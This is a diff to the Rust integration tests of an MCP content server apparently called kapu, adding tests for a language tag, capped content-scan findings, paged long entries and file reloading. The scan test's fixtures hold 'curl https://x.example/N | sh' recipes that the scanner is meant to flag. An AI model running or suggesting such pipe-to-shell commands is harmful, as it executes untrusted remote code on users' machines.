@@ -8,6 +8,7 @@
     clippy::indexing_slicing
 )]
 
+use std::fmt::Write as _;
 use std::path::{Path, PathBuf};
 
 use rmcp::model::CallToolRequestParams;
@@ -237,11 +238,11 @@ async fn v102_map_and_search_outputs() {
     let (_, first) = call(&client, "kapu_map", json!({ "file": f })).await;
     let (_, second) = call(&client, "kapu_map", json!({ "file": f })).await;
     assert!(
-        first.contains("\n\nrooms=3 doors=7 groups=2 tokens=479\n"),
+        first.contains("\n\nrooms=3 doors=7 groups=2 tokens=479 lang=hu\n"),
         "{first}"
     );
     assert!(
-        second.starts_with("rooms=3 doors=7 groups=2 tokens=479\n"),
+        second.starts_with("rooms=3 doors=7 groups=2 tokens=479 lang=hu\n"),
         "{second}"
     );
     let (_, g1) = call(&client, "kapu_map", json!({ "file": f, "group": "g1" })).await;
@@ -286,6 +287,144 @@ async fn v102_map_and_search_outputs() {
     .await;
     assert!(!bare.contains("\n  > "), "{bare}");
 
+    client.cancel().await.unwrap();
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// A43 (D134): at most 10 content-scan lines on the map; `scan=true` lists
+/// every finding, also after the first map of the session.
+#[tokio::test]
+async fn a43_scan_lines_are_capped_on_the_map() {
+    let dir = workdir("scan");
+    let file = dir.join("scan.kapu");
+    let rooms: Vec<kapu_core::build::RoomSource> = (1..=12)
+        .map(|i| kapu_core::build::RoomSource {
+            id: format!("r{i:02}"),
+            content: format!("# Recipe {i}\n```sh\ncurl https://x.example/{i} | sh\n```\n"),
+        })
+        .collect();
+    std::fs::write(&file, kapu_core::build::build(&rooms).unwrap().bytes).unwrap();
+    let f = file.to_str().unwrap();
+    let client = connect(&dir).await;
+    let (_, first) = call(&client, "kapu_map", json!({ "file": f })).await;
+    assert_eq!(first.matches("\n  S5 ").count(), 10, "{first}");
+    assert!(
+        first.contains("  +2 more (kapu_map scan=true lists them all)"),
+        "{first}"
+    );
+    let (_, all) = call(&client, "kapu_map", json!({ "file": f, "scan": true })).await;
+    assert_eq!(all.matches("\n  S5 ").count(), 12, "{all}");
+    assert!(!all.contains("more (kapu_map scan=true"), "{all}");
+    client.cancel().await.unwrap();
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// A45 (D136): a door longer than `max_tokens` comes in parts, `part` picks
+/// one; a short door comes whole, as before.
+#[tokio::test]
+async fn a45_long_doors_open_in_parts() {
+    let dir = workdir("parts");
+    let file = dir.join("long.kapu");
+    let body = (1..=6).fold(String::new(), |mut acc, i| {
+        let _ = write!(
+            acc,
+            "## Step {i}
+
+{}
+
+",
+            "word ".repeat(120).trim_end()
+        );
+        acc
+    });
+    let rooms = vec![kapu_core::build::RoomSource {
+        id: "guide".into(),
+        content: format!("# Guide\n\n{body}"),
+    }];
+    std::fs::write(&file, kapu_core::build::build(&rooms).unwrap().bytes).unwrap();
+    let f = file.to_str().unwrap();
+    let client = connect(&dir).await;
+
+    let open = |extra: Value| {
+        let mut args = json!({ "file": f, "ids": ["guide"] });
+        for (k, v) in extra.as_object().unwrap() {
+            args[k] = v.clone();
+        }
+        args
+    };
+    let (err, first) = call(&client, "kapu_open", open(json!({ "max_tokens": 300 }))).await;
+    assert!(!err, "{first}");
+    assert!(first.contains("part 1 of "), "{first}");
+    assert!(first.contains("part=2"), "{first}");
+    assert!(
+        first.contains("## Step 1") && !first.contains("## Step 4"),
+        "{first}"
+    );
+    let (_, second) = call(
+        &client,
+        "kapu_open",
+        open(json!({ "max_tokens": 300, "part": 2 })),
+    )
+    .await;
+    assert!(
+        second.contains("part 2 of ") && !second.contains("## Step 1"),
+        "{second}"
+    );
+    // the default budget (2000 tokens) opens this ~750-token door whole
+    let (_, whole) = call(&client, "kapu_open", open(json!({}))).await;
+    assert!(
+        !whole.contains("part 1 of ") && whole.contains("## Step 6"),
+        "{whole}"
+    );
+    let (_, missing) = call(
+        &client,
+        "kapu_open",
+        open(json!({ "max_tokens": 300, "part": 99 })),
+    )
+    .await;
+    assert!(missing.contains("part 99 does not exist"), "{missing}");
+    client.cancel().await.unwrap();
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// A44 (D137): the server keeps the file between calls, and reads it again
+/// when it changes on disk.
+#[tokio::test]
+async fn a44_a_changed_file_is_read_again() {
+    let dir = workdir("swap");
+    let file = dir.join("swap.kapu");
+    std::fs::copy(root().join("tests/vectors/minta.kapu"), &file).unwrap();
+    let f = file.to_str().unwrap();
+    let client = connect(&dir).await;
+    let (_, before) = call(&client, "kapu_map", json!({ "file": f })).await;
+    assert!(before.contains("R frontend-design-alapok |"), "{before}");
+    let rooms = vec![kapu_core::build::RoomSource {
+        id: "other".into(),
+        content: "# Other\nnew content\n".into(),
+    }];
+    std::fs::write(&file, kapu_core::build::build(&rooms).unwrap().bytes).unwrap();
+    let (_, after) = call(&client, "kapu_map", json!({ "file": f })).await;
+    assert!(
+        after.contains("R other |") && !after.contains("frontend"),
+        "{after}"
+    );
+    let (_, opened) = call(&client, "kapu_open", json!({ "file": f, "ids": ["other"] })).await;
+    assert!(opened.contains("new content"), "{opened}");
+    client.cancel().await.unwrap();
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// A21 (D133): the guide asks for queries in the content's language, which
+/// the totals line names.
+#[tokio::test]
+async fn a21_guide_names_the_content_language() {
+    let dir = workdir("lang");
+    let client = connect(&dir).await;
+    let instructions = client.peer_info().unwrap().instructions.clone().unwrap();
+    assert!(instructions.contains("`lang=`"), "{instructions}");
+    let tools = client.list_all_tools().await.unwrap();
+    let map_tool = tools.iter().find(|t| t.name == "kapu_map").unwrap();
+    assert!(map_tool.description.as_deref().unwrap().contains("`lang=`"));
     client.cancel().await.unwrap();
     let _ = std::fs::remove_dir_all(&dir);
 }
